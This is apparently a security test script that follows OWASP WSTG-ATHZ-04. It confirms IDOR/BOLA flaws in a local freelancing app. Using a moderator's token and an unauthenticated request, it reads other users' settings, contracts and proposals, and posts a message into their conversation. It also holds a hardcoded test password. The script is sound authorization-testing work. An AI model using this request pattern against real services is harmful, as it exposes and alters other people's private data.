"""
WSTG-ATHZ-04: IDOR/BOLA suite.
Expected:
- unauthenticated user settings access returns 200
- moderator can read another user's contract
- moderator can read and write another users' conversation
- moderator can query another freelancer's proposals
"""
import time
import requests

BASE = "http://localhost:3000"
FREELANCER_ID = "3fcfb3b4-8335-4b13-b813-3d425c3ecf7e"

settings = requests.get(f"{BASE}/api/users/{FREELANCER_ID}/settings", timeout=10)
print("Settings:", settings.status_code, settings.text[:120])
assert settings.status_code == 200

mod = requests.post(f"{BASE}/api/auth/login", json={
    "email": "carol.mod@hireflow.com",
    "password": "password123",
}, timeout=10).json()
mod_token = mod["token"]

stamp = str(int(time.time()))
reg = requests.post(f"{BASE}/api/auth/register", json={
    "email": f"wstg_idor_{stamp}@example.com",
    "username": f"wstgidor{stamp}",
    "password": "StrongPass1234",
    "display_name": "WSTG IDOR",
}, timeout=10).json()
client_token = reg["token"]

contract = requests.post(f"{BASE}/api/contracts", json={
    "freelancer_id": FREELANCER_ID,
    "title": f"WSTG IDOR contract {stamp}",
    "description": "IDOR contract",
    "amount": 400,
    "milestones": [{"title": "Only milestone", "amount": 400}],
}, headers={"Authorization": f"Bearer {client_token}"}, timeout=10).json()

read_contract = requests.get(
    f"{BASE}/api/contracts/{contract['id']}",
    headers={"Authorization": f"Bearer {mod_token}"},
    timeout=10,
)
print("Contract read:", read_contract.status_code)
assert read_contract.status_code == 200

props = requests.get(
    f"{BASE}/api/proposals?freelancer_id={FREELANCER_ID}",
    headers={"Authorization": f"Bearer {mod_token}"},
    timeout=10,
)
print("Proposal leak:", props.status_code)
assert props.status_code == 200

conv = requests.post(f"{BASE}/api/messages/conversations", json={
    "participant_ids": [FREELANCER_ID],
    "subject": f"WSTG convo {stamp}",
    "message": "Seed message"
}, headers={"Authorization": f"Bearer {client_token}"}, timeout=10).json()

conv_id = conv["id"]
read_conv = requests.get(
    f"{BASE}/api/messages/conversations/{conv_id}",
    headers={"Authorization": f"Bearer {mod_token}"},
    timeout=10,
)
write_conv = requests.post(
    f"{BASE}/api/messages/conversations/{conv_id}/messages",
    json={"content": "Moderator injected message"},
    headers={"Authorization": f"Bearer {mod_token}"},
    timeout=10,
)
print("Conversation read:", read_conv.status_code)
print("Conversation write:", write_conv.status_code)
assert read_conv.status_code == 200
assert write_conv.status_code == 201
print("\n[VULNERABLE] Multiple IDOR/BOLA paths confirmed")
